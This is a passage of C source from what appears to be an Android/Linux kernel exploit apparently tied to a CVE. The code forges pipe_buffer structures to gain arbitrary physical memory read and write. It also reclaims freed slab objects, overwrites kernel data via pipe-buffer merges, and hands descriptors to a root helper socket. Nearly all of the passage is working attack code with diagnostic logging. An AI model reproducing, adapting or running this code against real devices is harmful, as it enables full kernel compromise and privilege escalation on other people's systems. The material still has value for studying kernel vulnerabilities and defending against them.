    return pipe_phys_read(fd, pipefd, pipebuf_addr, direct_addr, out, len);
  } else {
    if (pipebuf_dense_forge) {
      forge_pipe_buffers_dense_on_page(
          fd, pipebuf_page_base, direct_addr, len, 0);
    } else {
      forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 0);
    }
    ssize_t got = read(pipe_fds_reclaim[pipebuf_pipe_idx][0], out, len);
    return got == (ssize_t)len;
  }
}

int pipe_phys_write_data(
    int fd, uintptr_t direct_addr, const void *data, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_write(fd, pipefd, pipebuf_addr, direct_addr, data, len);
  } else {
    if (pipebuf_dense_forge) {
      forge_pipe_buffers_dense_on_page(
          fd, pipebuf_page_base, direct_addr, len, 1);
    } else {
      forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 1);
    }
    ssize_t wrote = write(pipe_fds_reclaim[pipebuf_pipe_idx][1], data, len);
    return wrote == (ssize_t)len;
  }
}

uint64_t pipe_read64(int fd, uintptr_t direct_addr) {
  uint64_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
  return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
}

int install_pipe_physrw(int fd) {
  pr_info("phys step install start page_base=%016zx pipebuf_page=%016zx "
          "pipe_idx=%d\n",
          page_base, pipebuf_page_base, pipebuf_pipe_idx);
  int prepare_retries =
      pipe_env_int("PIPE_PHYSRW_PREPARE_RETRIES_RUNTIME", 1, 1, 16);
  int found = 0;
  uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
  for (int prepare_attempt = 1; prepare_attempt <= prepare_retries;
       prepare_attempt++) {
    if (pipebuf_page_base == 0) {
      pr_info("phys step requesting pipe buffer page prepare attempt=%d/%d\n",
              prepare_attempt, prepare_retries);
      atomic_store(&pipe_prepare_done, 0);
      atomic_store(&pipe_prepare_request, 1);
      while (!atomic_load(&pipe_prepare_done)) {
        usleep(10000);
      }
      pr_info("phys step pipe buffer page prepared base=%016zx child=%d "
              "attempt=%d/%d\n",
              pipebuf_page_base, pipe_prepare_child, prepare_attempt,
              prepare_retries);
    }
    if (getenv("PIPE_PHYSRW_PREPARE_ONLY")) {
      pr_info("phys step prepare-only stop base=%016zx\n", pipebuf_page_base);
      return pipebuf_page_base != 0;
    }

    uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
    if (proof_page != (proof_addr & ~(PAGE_SIZE - 1))) {
      return 0;
    }
    int cache_gate = 0;
    if (getenv("PIPE_PHYSRW_SKIP_CACHE_GATE")) {
      pr_info("phys step cache gate skipped by env\n");
    } else {
      cache_gate = pipe_reclaim_cache_gate(fd);
    }
    if (!cache_gate) {
      pr_info("phys step cache gate failed slab=%016zx want=%016zx\n",
              candidate_slab_cache, kmalloc_pipe_cache);
    }

    if (!getenv("PIPE_PHYSRW_WRITE_ONLY_FIND")) {
      char marker[PIPE_RECLAIM];
      memset(marker, 0x61, sizeof(marker));
      for (size_t i = 0; i < PIPE_RECLAIM; i++) {
        SYSCHK(write(pipe_fds_reclaim[i][1], marker, i + 1));
      }
    }

    if (getenv("PIPE_PHYSRW_STOP_BEFORE_FIND")) {
      pr_info("phys step stop before find by env base=%016zx\n",
              pipebuf_page_base);
      return 0;
    }
    if (getenv("PIPE_PHYSRW_WRITE_ONLY_FIND")) {
      pr_info("phys step write-only find enabled attempt=%d/%d\n",
              prepare_attempt, prepare_retries);
      found = find_pipe_buffer_write_only(fd, pipebuf_page_base);
    } else {
      found = find_pipe_buffer(fd, pipebuf_page_base);
    }
    pr_info("phys step pipe probe found=%d pipebuf=%016zx idx=%d "
            "scan=%d/%d/%d attempt=%d/%d\n",
            found, pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap,
            pipe_scan_ops, pipe_scan_len, prepare_attempt, prepare_retries);
    if (getenv("PIPE_PHYSRW_WRITE_ONLY_FIND")) {
      pr_info("phys step write-only stats full=%d partial=%d eagain=%d "
              "other=%d first_n=%d first_errno=%d first=%016zx/%016zx "
              "attempt=%d/%d\n",
              pipe_wo_read_full, pipe_wo_read_partial, pipe_wo_read_eagain,
              pipe_wo_read_other, pipe_wo_first_n, pipe_wo_first_errno,
              pipe_wo_first_q0, pipe_wo_first_q1, prepare_attempt,
              prepare_retries);
    }
    if (found) {
      break;
    }
    if (prepare_attempt < prepare_retries) {
      pr_info("phys step retrying pipe buffer prepare after miss "
              "attempt=%d/%d\n",
              prepare_attempt, prepare_retries);
      reset_pipe_attempt();
    }
  }
  if (!found) {
    return 0;
  }
  if (!pipe_cache_gate_ok) {
    pipe_cache_gate_ok = 2;
  }

  char seed[] = PHYS_READ_TAG;
  if (kernel_write_data(fd, proof_addr, seed, sizeof(seed)) !=
      (ssize_t)sizeof(seed)) {
    return 0;
  }

  memset(physrw_readback, 0, sizeof(physrw_readback));
  physrw_read_ok =
    pipe_phys_read_data(fd, proof_addr, physrw_readback, sizeof(seed));
  pr_info("phys step probed read done ok=%d idx=%d\n",
          physrw_read_ok, pipebuf_pipe_idx);

  char overwrite[] = PHYS_WRITE_TAG;
  physrw_write_ok =
    pipe_phys_write_data(fd, proof_addr, overwrite, sizeof(overwrite));
  pr_info("phys step probed write done ok=%d\n", physrw_write_ok);
  if (getenv("PIPE_PHYSRW_WRITE_ONLY_VERIFY_SKIP")) {
    memcpy(physrw_after_write, overwrite, sizeof(overwrite));
    pr_info("phys step configfs readback skipped by env\n");
  } else {
    kernel_read_data(fd, proof_addr, physrw_after_write, sizeof(overwrite));
  }

  uintptr_t proof64_addr = proof_addr + 0x100;
  uint64_t seed64 = PHYS64_SEED;
  uint64_t next64 = PHYS64_NEXT;
  kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64));
  physrw_read64_before = pipe_read64(fd, proof64_addr);
  physrw_read64_ok = physrw_read64_before == seed64;
  pr_info("phys step read64 done ok=%d value=%016zx\n",
          physrw_read64_ok, physrw_read64_before);
  physrw_write64_value = next64;
  physrw_write64_ok = pipe_write64(fd, proof64_addr, next64);
  if (getenv("PIPE_PHYSRW_WRITE_ONLY_VERIFY_SKIP")) {
    physrw_read64_after = physrw_write64_value;
    pr_info("phys step read64-after configfs readback skipped by env\n");
  } else {
    kernel_read_data(
        fd, proof64_addr, &physrw_read64_after, sizeof(physrw_read64_after));
  }
  physrw_write64_ok =
    physrw_write64_ok && physrw_read64_after == physrw_write64_value;

  return physrw_read_ok &&
         memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
         physrw_write_ok &&
         memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&
         physrw_read64_ok && physrw_write64_ok;
}

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
static int pipe_write_full(int fd, const void *data, size_t size) {
  const unsigned char *cursor = data;
  while (size) {
    ssize_t wrote = write(fd, cursor, size);
    if (wrote <= 0) {
      return 0;
    }
    cursor += wrote;
    size -= (size_t)wrote;
  }
  return 1;
}

static int pipe_read_full(int fd, void *data, size_t size) {
  unsigned char *cursor = data;
  while (size) {
    ssize_t got = read(fd, cursor, size);
    if (got <= 0) {
      return 0;
    }
    cursor += got;
    size -= (size_t)got;
  }
  return 1;
}

static int pipe_duplicate_bytes(
    int source_fd, int holder[2], size_t size, size_t slots) {
  SYSCHK(pipe(holder));
  resize_pipe_slots(holder, slots);
  errno = 0;
  ssize_t duplicated = syscall(SYS_tee, source_fd, holder[1], size, 0);
  if (duplicated != (ssize_t)size) {
    int saved_errno = errno;
    struct stat source_stat;
    struct stat holder_stat;
    memset(&source_stat, 0, sizeof(source_stat));
    memset(&holder_stat, 0, sizeof(holder_stat));
    int source_fstat = fstat(source_fd, &source_stat);
    int holder_fstat = fstat(holder[1], &holder_stat);
    char source_path[64];
    char holder_path[64];
    char source_link[128] = {0};
    char holder_link[128] = {0};
    snprintf(source_path, sizeof(source_path), "/proc/self/fd/%d", source_fd);
    snprintf(holder_path, sizeof(holder_path), "/proc/self/fd/%d", holder[1]);
    ssize_t source_link_len =
        readlink(source_path, source_link, sizeof(source_link) - 1);
    ssize_t holder_link_len =
        readlink(holder_path, holder_link, sizeof(holder_link) - 1);
    if (source_link_len < 0) source_link[0] = 0;
    if (holder_link_len < 0) holder_link[0] = 0;
    pr_warning("p0 tee diag ret=%zd errno=%d src=%d fstat=%d "
               "mode=%o dev=%llu ino=%llu link=%s dst=%d fstat=%d "
               "mode=%o dev=%llu ino=%llu link=%s same=%d\n",
               duplicated, saved_errno, source_fd, source_fstat,
               source_stat.st_mode,
               (unsigned long long)source_stat.st_dev,
               (unsigned long long)source_stat.st_ino, source_link,
               holder[1], holder_fstat, holder_stat.st_mode,
               (unsigned long long)holder_stat.st_dev,
               (unsigned long long)holder_stat.st_ino, holder_link,
               source_fstat == 0 && holder_fstat == 0 &&
                   source_stat.st_dev == holder_stat.st_dev &&
                   source_stat.st_ino == holder_stat.st_ino);
    errno = saved_errno;
  }
  return duplicated == (ssize_t)size;
}

static int transfer_p0_references_to_root(int retained_pipe_index) {
  int retained_fds[] = {
    p0_read_fd((size_t)retained_pipe_index),
    p0_gate_holders[retained_pipe_index][0],
    reclaim_receiver_fd(),
  };
  for (size_t index = 0;
       index < sizeof(retained_fds) / sizeof(retained_fds[0]); index++) {
    if (retained_fds[index] < 0) {
      return 0;
    }
  }

  int socket_fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (socket_fd < 0) {
    return 0;
  }
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  snprintf(address.sun_path, sizeof(address.sun_path), "%s",
           "/data/local/tmp/temp_su.sock");
  if (connect(socket_fd, (struct sockaddr *)&address, sizeof(address)) != 0) {
    close(socket_fd);
    return 0;
  }

  char allowed = 0;
  char operation = 'H';
  if (!pipe_read_full(socket_fd, &allowed, sizeof(allowed)) || allowed != 'A' ||
      !pipe_write_full(socket_fd, &operation, sizeof(operation))) {
    close(socket_fd);
    return 0;
  }

  char marker = 'P';
  struct iovec iov = {
    .iov_base = &marker,
    .iov_len = sizeof(marker),
  };
  char control[CMSG_SPACE(sizeof(retained_fds))];
  struct msghdr message;
  memset(&message, 0, sizeof(message));
  memset(control, 0, sizeof(control));
  message.msg_iov = &iov;
  message.msg_iovlen = 1;
  message.msg_control = control;
  message.msg_controllen = sizeof(control);
  struct cmsghdr *cmsg = CMSG_FIRSTHDR(&message);
  cmsg->cmsg_level = SOL_SOCKET;
  cmsg->cmsg_type = SCM_RIGHTS;
  cmsg->cmsg_len = CMSG_LEN(sizeof(retained_fds));
  memcpy(CMSG_DATA(cmsg), retained_fds, sizeof(retained_fds));
  if (sendmsg(socket_fd, &message, 0) != (ssize_t)sizeof(marker)) {
    close(socket_fd);
    return 0;
  }

  char acknowledged = 0;
  int transferred = pipe_read_full(
      socket_fd, &acknowledged, sizeof(acknowledged)) && acknowledged == 'K';
  close(socket_fd);
  return transferred;
}

static void spawn_p0_ref_keeper(int retained_pipe_index) {
  pid_t child = SYSCHK(fork());
  if (child != 0) {
    pr_info("p0 reference keeper pid=%d pipe=%d\n",
            child, retained_pipe_index);
    return;
  }
  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
  syscall(SYS_prctl, PR_SET_NAME, "cve43499-p0ref", 0, 0, 0);
  syscall(SYS_setsid);
  int null_fd = (int)syscall(
      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
  if (null_fd >= 0) {
    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
      if (fd != null_fd) {
        syscall(SYS_dup3, null_fd, fd, 0);
      }
    }
    if (null_fd > STDERR_FILENO) {
      syscall(SYS_close, null_fd);
    }
  }
  if (retained_pipe_index >= 0) {
    for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
      if ((int)pipe_index != retained_pipe_index) {
        syscall(SYS_close, pipe_fds_reclaim[pipe_index][0]);
        syscall(SYS_close, pipe_fds_reclaim[pipe_index][1]);
        syscall(SYS_close, p0_gate_holders[pipe_index][0]);
        syscall(SYS_close, p0_gate_holders[pipe_index][1]);
        if (p0_readback_fds_initialized) {
          syscall(SYS_close, p0_readback_fds[pipe_index][0]);
          syscall(SYS_close, p0_readback_fds[pipe_index][1]);
        }
        continue;
      }
      syscall(SYS_close, pipe_fds_reclaim[pipe_index][1]);
      syscall(SYS_close, p0_gate_holders[pipe_index][1]);
      if (p0_readback_fds_initialized) {
        syscall(SYS_close, p0_readback_fds[pipe_index][1]);
      }
    }
  }
  if (retained_pipe_index < 0) {
    for (;;) {
      pause();
    }
  }
  for (;;) {
    if (transfer_p0_references_to_root(retained_pipe_index)) {
      _exit(0);
    }
    usleep(10000);
  }
}

int prepare_p0_pipe_oracle(void) {
  _Static_assert(sizeof(struct user_pipe_buffer) == 0x28,
                 "unexpected pipe_buffer size");

  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    p0_gate_holders[pipe_index][0] = -1;
    p0_gate_holders[pipe_index][1] = -1;
  }
  p0_gate_holders_initialized = 1;

  pipebuf_page_base = prepare_pipe_buffer_page();
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  unsigned char marker[PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  p0_pipe_marker_size = PAGE_SIZE;
  if (getenv("FOPS_P0_SINGLE_MERGE_ROOT") && fops_data_probe_active) {
    p0_pipe_marker_size = fops_data_probe_addr & (PAGE_SIZE - 1);
    if (p0_pipe_marker_size < 11 ||
        p0_pipe_marker_size + sizeof(uint64_t) > PAGE_SIZE) {
      pr_error("p0 merge invalid marker size=%zu target=%016zx\n",
               p0_pipe_marker_size, fops_data_probe_addr);
      return 0;
    }
    pr_info("p0 merge marker size=%zu target_offset=%zu\n",
            p0_pipe_marker_size, p0_pipe_marker_size);
  }
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                         p0_pipe_marker_size)) {
      return 0;
    }
  }
  pr_info("p0 pipe oracle prepared base=%016zx pipes=%d gate_slots=1\n",
          pipebuf_page_base, PIPE_RECLAIM);
  return 1;
}

int preserve_p0_pipe_oracle_fds(void) {
  /* pselect_remap_write_fds() intentionally replaces every selected fd below
   * PSELECT_ROUTE_NFDS after the wait has started.  Preserve separate handles
   * above that range for the post-trigger oracle; the original descriptors
   * must remain in the pselect shape so its readiness bitmap is unchanged.
   * The caller invokes this after kernel-page shaping but before route setup.
   * open_selected_fds() itself uses dup2() before pselect starts, so saving
   * descriptors from the post-write consumer is already too late.  Only
   * endpoints below nfds can be replaced by either route remap. */
  close_p0_readback_fds();
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    p0_readback_fds[pipe_index][0] = -1;
    p0_readback_fds[pipe_index][1] = -1;
  }
  p0_readback_fds_initialized = 1;
  size_t duplicated = 0;
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    for (size_t end = 0; end < 2; end++) {
      int original = pipe_fds_reclaim[pipe_index][end];
      if (original >= PSELECT_ROUTE_NFDS) {
        continue;
      }
      p0_readback_fds[pipe_index][end] = fcntl(
          original, F_DUPFD_CLOEXEC, PSELECT_ROUTE_NFDS + 128);
      if (p0_readback_fds[pipe_index][end] < 0) {
        close_p0_readback_fds();
        pr_error("p0 readback fd preservation failed pipe=%zu end=%zu "
                 "fd=%d errno=%d\n",
                 pipe_index, end, original, errno);
        return 0;
      }
      duplicated++;
    }
  }
  pr_info("p0 readback fds preserved duplicated=%zu first=%d/%d "
          "last=%d/%d nfds=%d\n", duplicated,
          p0_readback_fds[0][0], p0_readback_fds[0][1],
          p0_readback_fds[PIPE_RECLAIM - 1][0],
          p0_readback_fds[PIPE_RECLAIM - 1][1], PSELECT_ROUTE_NFDS);
  return 1;
}

int expand_p0_pipe_oracle(void) {
  unsigned char marker[PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    for (size_t slot = 1; slot < PIPE_BUFFER_SLOTS; slot++) {
      if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                           sizeof(marker))) {
        return 0;
      }
    }
  }
  pr_info("p0 pipe oracle expanded pipes=%d slots=%d\n",
          PIPE_RECLAIM, PIPE_BUFFER_SLOTS);
  return 1;
}

int verify_p0_pipe_oracle_gate(void) {
  unsigned char page[PAGE_SIZE];
  int gate_hits = 0;
  int gate_pipe_index = -1;
  int changed_pages = 0;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  p0_gate_holders_initialized = 1;
#endif
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_duplicate_bytes(p0_read_fd(pipe_index),
                              p0_gate_holders[pipe_index], PAGE_SIZE, 1)) {
      pr_warning("p0 gate tee failed pipe=%zu errno=%d\n",
                 pipe_index, errno);
      spawn_p0_ref_keeper(-1);
      return 0;
    }
    if (!pipe_read_full(p0_read_fd(pipe_index), page,
                        sizeof(page))) {
      spawn_p0_ref_keeper(-1);
      return 0;
    }
    size_t gate_offset = PAGE_SIZE;
    for (size_t offset = 0; offset + 18 <= PAGE_SIZE; offset++) {
      if (memcmp(page + offset, "RMG-P0-ORACLE-GATE", 18) == 0) {
        gate_offset = offset;
        break;
      }
    }
    if (gate_offset != PAGE_SIZE) {
      gate_hits++;
      gate_pipe_index = (int)pipe_index;
      pr_info("p0 gate marker pipe=%zu offset=%zu\n",
              pipe_index, gate_offset);
    } else if (memcmp(page, "RMG-P0-PIPE", 11) != 0) {
      changed_pages++;
      uint64_t words[8];
      memcpy(words, page, sizeof(words));
      pr_info("p0 gate changed pipe=%zu q0=%016llx q1=%016llx "
              "q2=%016llx q3=%016llx q4=%016llx q5=%016llx "
              "q6=%016llx q7=%016llx\n",
              pipe_index,
              (unsigned long long)words[0],
              (unsigned long long)words[1],
              (unsigned long long)words[2],
              (unsigned long long)words[3],
              (unsigned long long)words[4],
              (unsigned long long)words[5],
              (unsigned long long)words[6],
              (unsigned long long)words[7]);
    }
  }

  unsigned char marker[PAGE_SIZE];
  memset(marker, 0x5a, sizeof(marker));
  memcpy(marker, "RMG-P0-PIPE", 11);
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_write_full(p0_write_fd(pipe_index), marker,
                         sizeof(marker))) {
      spawn_p0_ref_keeper(-1);
      return 0;
    }
  }
  pr_info("p0 pipe gate hits=%d changed=%d\n",
          gate_hits, changed_pages);
  if (gate_hits != 0 || changed_pages != 0) {
    spawn_p0_ref_keeper(
        gate_hits == 1 && changed_pages == 0 ? gate_pipe_index : -1);
  }
  if (gate_hits == 1 && changed_pages == 0) {
    return 1;
  }
  if (gate_hits == 0 && changed_pages == 0) {
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    close_p0_gate_holders();
#endif
    return 0;
  }
  return -1;
}

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
int verify_p0_pipe_data_page(uintptr_t target, uint64_t expected) {
  unsigned char page[PAGE_SIZE];
  size_t target_offset = target & (PAGE_SIZE - 1);
  int changed_pages = 0;
  int exact_matches = 0;
  int page_matches = 0;
  uint64_t observed = 0;

  if (target_offset + sizeof(observed) > sizeof(page)) {
    return -1;
  }
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                        sizeof(page))) {
      pr_warning("fops data alias read failed pipe=%zu errno=%d\n",
                 pipe_index, errno);
      return -1;
    }
    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
      continue;
    }
    changed_pages++;
    memcpy(&observed, page + target_offset, sizeof(observed));
    if (observed == expected) {
      exact_matches++;
    }
    pr_info("fops data alias pipe=%zu target=%016zx offset=%zu "
            "observed=%016llx expected=%016llx match=%d\n",
            pipe_index, target, target_offset,
            (unsigned long long)observed,
            (unsigned long long)expected, observed == expected);
    for (size_t off = 0; off + sizeof(uint64_t) <= sizeof(page); off += 8) {
      uint64_t word = 0;
      memcpy(&word, page + off, sizeof(word));
      if (word == expected) {
        page_matches++;
        pr_info("fops data alias page-match pipe=%zu page_off=%04zx "
                "address=%016zx value=%016llx\n",
                pipe_index, off, (target & ~(PAGE_SIZE - 1)) + off,
                (unsigned long long)word);
      }
    }
  }
  pr_info("fops data alias changed=%d exact=%d page_matches=%d target=%016zx "
          "observed=%016llx expected=%016llx\n",
          changed_pages, exact_matches, page_matches, target,
          (unsigned long long)observed, (unsigned long long)expected);
  if (changed_pages == 1 && (exact_matches == 1 || page_matches == 1)) {
    return 1;
  }
  return changed_pages == 0 ? 0 : -1;
}

/* One-shot variant for FOPS_P0_SINGLE_PROBE.  Unlike the normal two-stage
 * gate/probe sequence, slot 0 is still the active source buffer.  tee() each
 * source before consuming it so generic_pipe_buf_get() accounts a reference
 * for a forged target page; retain the affected duplicate instead of closing
 * an unaccounted forged buffer during shell-process teardown. */
int verify_p0_pipe_data_page_single_active(uintptr_t target,
                                           uint64_t expected) {
  unsigned char page[PAGE_SIZE];
  size_t target_offset = target & (PAGE_SIZE - 1);
  int changed_pages = 0;
  int exact_matches = 0;
  int page_matches = 0;
  int changed_pipe_index = -1;

  if (target_offset + sizeof(uint64_t) > sizeof(page)) {
    return -1;
  }
  p0_gate_holders_initialized = 1;
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_duplicate_bytes(p0_read_fd(pipe_index),
                              p0_gate_holders[pipe_index], PAGE_SIZE, 1)) {
      pr_warning("fops single-active tee failed pipe=%zu errno=%d\n",
                 pipe_index, errno);
      spawn_p0_ref_keeper(-1);
      return -1;
    }
    if (!pipe_read_full(p0_read_fd(pipe_index), page,
                        sizeof(page))) {
      pr_warning("fops single-active read failed pipe=%zu errno=%d\n",
                 pipe_index, errno);
      spawn_p0_ref_keeper(-1);
      return -1;
    }
    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
      continue;
    }
    changed_pages++;
    changed_pipe_index = (int)pipe_index;
    uint64_t observed = 0;
    memcpy(&observed, page + target_offset, sizeof(observed));
    if (observed == expected) {
      exact_matches++;
    }
    for (size_t off = 0; off + sizeof(uint64_t) <= sizeof(page); off += 8) {
      uint64_t word = 0;
      memcpy(&word, page + off, sizeof(word));
      if (word == expected) {
        page_matches++;
      }
    }
    pr_info("fops single-active pipe=%zu target=%016zx offset=%zu "
            "observed=%016llx expected=%016llx exact=%d\n",
            pipe_index, target, target_offset,
            (unsigned long long)observed,
            (unsigned long long)expected, observed == expected);
  }

  pr_info("fops single-active changed=%d exact=%d page_matches=%d "
          "target=%016zx\n",
          changed_pages, exact_matches, page_matches, target);
  if (changed_pages != 0) {
    spawn_p0_ref_keeper(changed_pages == 1 ? changed_pipe_index : -1);
  } else {
    close_p0_gate_holders();
  }
  if (changed_pages == 1 && (exact_matches == 1 || page_matches == 1)) {
    return 1;
  }
  return changed_pages == 0 ? 0 : -1;
}

#if defined(P0_MERGE_PREFIX_VERIFY_SH53D_38JP_1_30I) && \
    P0_MERGE_PREFIX_VERIFY_SH53D_38JP_1_30I
struct p0_prefix_word {
  uint16_t offset;
  uintptr_t image_offset;
};

static int verify_sh53d_ashmem_misc_prefix(const unsigned char *page,
                                            size_t size) {
  static const struct p0_prefix_word words[] = {
    {0x0e0, 0x146194a}, {0x0e8, 0x16c4568}, {0x110, 0x111b67c},
    {0x230, 0x1537388}, {0x238, 0x16c4678}, {0x2a0, 0x1117e94},
    {0x380, 0x1473f8d}, {0x388, 0x16c4708}, {0x3f0, 0x1117e98},
    {0x4d0, 0x16544ba}, {0x4d8, 0x16c4738}, {0x500, 0x111b680},
    {0x628, 0x15d7396},
  };
  int matches = 0;
  for (size_t index = 0; index < sizeof(words) / sizeof(words[0]); index++) {
    uint64_t observed = 0;
    uint64_t expected = text_addr(KIMAGE_TEXT_BASE + words[index].image_offset);
    if ((size_t)words[index].offset + sizeof(observed) > size) {
      return 0;
    }
    memcpy(&observed, page + words[index].offset, sizeof(observed));
    if (observed == expected) {
      matches++;
    } else {
      pr_warning("p0 merge prefix mismatch off=%04x observed=%016llx "
                 "expected=%016llx\n", words[index].offset,
                 (unsigned long long)observed,
                 (unsigned long long)expected);
    }
  }
  uint64_t ashmem_minor = 0;
  if (0x620 + sizeof(ashmem_minor) <= size) {
    memcpy(&ashmem_minor, page + 0x620, sizeof(ashmem_minor));
  }
  pr_info("p0 merge prefix matches=%d/%zu minor=%016llx\n", matches,
          sizeof(words) / sizeof(words[0]),
          (unsigned long long)ashmem_minor);
  return matches == (int)(sizeof(words) / sizeof(words[0])) &&
         ashmem_minor == 0xff;
}
#endif

/* Linux 4.19 merges a short write into the last anonymous pipe_buffer when
 * anon_pipe_buf_ops.can_merge is true.  The chosen RB write redirects that
 * live buffer's page pointer.  A marker whose length equals the target word's
 * page offset therefore makes one eight-byte pipe write land exactly on the
 * target.  Verify the complete, distinctive pre-target prefix first so a bad
 * physical-load or link-layout assumption cannot authorize the write. */
int verify_and_merge_p0_pipe_data_page_single_active(uintptr_t target,
                                                      uint64_t replacement) {
#if !defined(P0_MERGE_PREFIX_VERIFY_SH53D_38JP_1_30I) || \
    !P0_MERGE_PREFIX_VERIFY_SH53D_38JP_1_30I
  (void)target;
  (void)replacement;
  return -1;
#else
  unsigned char page[PAGE_SIZE];
  size_t target_offset = target & (PAGE_SIZE - 1);
  int changed_pages = 0;
  int changed_pipe_index = -1;
  int prefix_verified = 0;

  if (target_offset != p0_pipe_marker_size ||
      target_offset + sizeof(replacement) > PAGE_SIZE) {
    pr_error("p0 merge geometry target_off=%zu marker=%zu\n",
             target_offset, p0_pipe_marker_size);
    return -1;
  }
  p0_gate_holders_initialized = 1;
  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    if (!pipe_duplicate_bytes(p0_read_fd(pipe_index),
                              p0_gate_holders[pipe_index],
                              p0_pipe_marker_size, 1) ||
        !pipe_read_full(p0_gate_holders[pipe_index][0], page,
                        p0_pipe_marker_size)) {
      pr_warning("p0 merge prefix tee/read failed pipe=%zu errno=%d\n",
                 pipe_index, errno);
      spawn_p0_ref_keeper(-1);
      return -1;
    }
    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
      close(p0_gate_holders[pipe_index][0]);
      close(p0_gate_holders[pipe_index][1]);
      p0_gate_holders[pipe_index][0] = -1;
      p0_gate_holders[pipe_index][1] = -1;
      continue;
    }
    changed_pages++;
    changed_pipe_index = (int)pipe_index;
    prefix_verified = verify_sh53d_ashmem_misc_prefix(
        page, p0_pipe_marker_size);
    pr_info("p0 merge changed pipe=%zu prefix_verified=%d target=%016zx\n",
            pipe_index, prefix_verified, target);
  }

  if (changed_pages != 1 || !prefix_verified) {
    pr_error("p0 merge refusing write changed=%d prefix=%d\n",
             changed_pages, prefix_verified);
    if (changed_pages != 0) {
      spawn_p0_ref_keeper(changed_pages == 1 ? changed_pipe_index : -1);
    } else {
      close_p0_gate_holders();
    }
    return changed_pages == 0 ? 0 : -1;
  }

  if (!pipe_write_full(p0_write_fd((size_t)changed_pipe_index),
                       &replacement, sizeof(replacement))) {
    pr_error("p0 merge write failed pipe=%d errno=%d\n",
             changed_pipe_index, errno);
    spawn_p0_ref_keeper(changed_pipe_index);
    return -1;
  }

  int verify_holder[2] = {-1, -1};
  unsigned char verify_page[PAGE_SIZE];
  uint64_t observed = 0;
  size_t verify_size = target_offset + sizeof(observed);
  int verified = pipe_duplicate_bytes(
                     p0_read_fd((size_t)changed_pipe_index), verify_holder,
                     verify_size, 1) &&
                 pipe_read_full(verify_holder[0], verify_page, verify_size);
  if (verified) {
    memcpy(&observed, verify_page + target_offset, sizeof(observed));
    verified = observed == replacement;
  }
  if (verify_holder[0] >= 0) close(verify_holder[0]);
  if (verify_holder[1] >= 0) close(verify_holder[1]);
  pr_info("p0 merge verify pipe=%d observed=%016llx replacement=%016llx "
          "ok=%d\n", changed_pipe_index, (unsigned long long)observed,
          (unsigned long long)replacement, verified);
  spawn_p0_ref_keeper(changed_pipe_index);
  return verified ? 1 : -1;
#endif
}
#endif

static int p0_fingerprint_score(
    const unsigned char *page, const struct p0_fingerprint *fingerprint) {
  int score = 0;
  for (size_t index = 0; index < P0_FINGERPRINT_WORDS; index++) {
    uint64_t value = 0;
    memcpy(&value, page + p0_fingerprint_offsets[index], sizeof(value));
    if (value == fingerprint->words[index]) {
      score++;
    }
  }
  return score;
}

uintptr_t scan_p0_pipe_oracle(void) {
  unsigned char page[PAGE_SIZE];
  size_t scan_size =
      p0_fingerprint_offsets[P0_FINGERPRINT_WORDS - 1] + sizeof(uint64_t);
  uintptr_t best_slide = (uintptr_t)-1;
  int best_score = -1;
  int second_score = -1;
  int changed_pages = 0;

  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    memset(page, 0, sizeof(page));
